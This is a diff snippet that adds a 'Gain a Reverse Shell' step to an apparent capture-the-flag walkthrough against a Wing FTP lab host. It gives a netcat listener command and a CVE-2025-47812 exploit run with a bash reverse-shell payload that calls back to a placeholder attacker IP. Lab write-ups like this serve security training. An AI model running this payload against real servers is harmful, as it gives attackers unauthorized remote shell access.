@@ -570,7 +570,12 @@ wingftp
 
 **Gain a Reverse Shell:**
 
+Once RCE is confirmed, the logical next step is to move from single command execution to an interactive shell.
 
+- **Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.
+- **Exploit:** Run the script with a bash reverse shell payload:
+
+Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1"`
 <div align="center">
 <br>
 <br>
